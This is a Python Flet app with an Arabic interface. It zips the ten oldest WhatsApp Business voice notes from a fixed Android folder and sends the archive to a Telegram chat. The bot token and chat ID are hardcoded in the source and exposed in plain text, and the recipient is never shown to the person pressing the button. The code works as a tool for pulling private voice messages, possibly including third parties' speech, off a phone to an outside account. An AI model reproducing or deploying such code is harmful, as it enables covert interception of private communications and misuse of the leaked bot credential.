import os
import zipfile
import telebot
import time
import flet as ft

# إعدادات تيليجرام
BOT_TOKEN = "7259492835:AAEJhhqbEzTOj0Q7vZj6YOK0PmwRHYqaroM"
CHAT_ID = "6486770497"
bot = telebot.TeleBot(BOT_TOKEN)

# إعدادات المجلدات
TARGET_FOLDER = "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Voice Notes/202503"
ZIP_PATH = "/storage/emulated/0/Download/voice_notes.zip"

# دوال المعالجة
def get_first_n_files(folder, limit=10):
    if not os.path.exists(folder):
        raise FileNotFoundError(f"المجلد '{folder}' غير موجود!")
    files = [
        os.path.join(folder, file)
        for file in os.listdir(folder)
        if os.path.isfile(os.path.join(folder, file))
    ]
    return sorted(files, key=os.path.getmtime)[:limit]

def zip_selected_files(files, zip_filename):
    try:
        with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
            total = len(files)
            for idx, file in enumerate(files, start=1):
                zipf.write(file, os.path.basename(file))
                # تحديث تقدم الضغط (محاكاة)
                progress = idx / total
                print(f"ضغط الملف {idx} من {total} - {progress*100:.0f}%")
                time.sleep(0.1)
        return zip_filename if os.path.exists(zip_filename) else None
    except Exception as ex:
        print("Error zipping files:", ex)
        return None

# التطبيق باستخدام Flet
def main(page: ft.Page):
    page.title = "ضغط وإرسال التسجيلات الصوتية"
    page.theme_mode = ft.ThemeMode.DARK

    status_text = ft.Text("", size=16)
    progress_bar = ft.ProgressBar(width=300, visible=False)

    def send_files(e):
        status_text.value = "🔄 جاري معالجة الملفات..."
        progress_bar.value = 0
        progress_bar.visible = True
        page.update()

        # التحقق من وجود المجلد الهدف
        if not os.path.exists(TARGET_FOLDER):
            status_text.value = f"❌ المجلد {TARGET_FOLDER} غير موجود!"
            progress_bar.visible = False
            page.update()
            return

        try:
            # الحصول على أول 10 ملفات
            selected_files = get_first_n_files(TARGET_FOLDER, 10)
        except FileNotFoundError as err:
            status_text.value = f"❌ {err}"
            progress_bar.visible = False
            page.update()
            return

        if not selected_files:
            status_text.value = f"❌ لا يوجد تسجيلات في المجلد {TARGET_FOLDER}"
            progress_bar.visible = False
            page.update()
            return

        # تحديث progress bar - مرحلة الضغط
        progress_bar.value = 0.3
        page.update()

        # ضغط الملفات
        zip_file = zip_selected_files(selected_files, ZIP_PATH)
        if not zip_file:
            status_text.value = "❌ فشل ضغط الملفات!"
            progress_bar.visible = False
            page.update()
            return

        # تحديث progress bar - بعد الانتهاء من الضغط
        progress_bar.value = 0.7
        page.update()

        try:
            # إرسال الملف عبر تيليجرام
            with open(ZIP_PATH, "rb") as file:
                bot.send_document(CHAT_ID, file)
            status_text.value = f"✅ تم إرسال 10 تسجيلات من مجلد {TARGET_FOLDER} إلى تيليجرام"
        except Exception as ex:
            status_text.value = f"❌ حدث خطأ أثناء الإرسال: {ex}"
        progress_bar.value = 1.0
        progress_bar.visible = False
        page.update()

    send_button = ft.ElevatedButton("إرسال التسجيلات", on_click=send_files)

    # تغليف جميع العناصر داخل عمود في منتصف الصفحة
    page.add(
        ft.Column(
            [
                ft.Text("ضغط وإرسال التسجيلات الصوتية", size=24, weight="bold"),
                send_button,
                progress_bar,
                status_text,
            ],
            alignment=ft.MainAxisAlignment.CENTER,
            horizontal_alignment=ft.CrossAxisAlignment.CENTER,
            spacing=20,
            expand=True
        )
    )

ft.app(target=main)
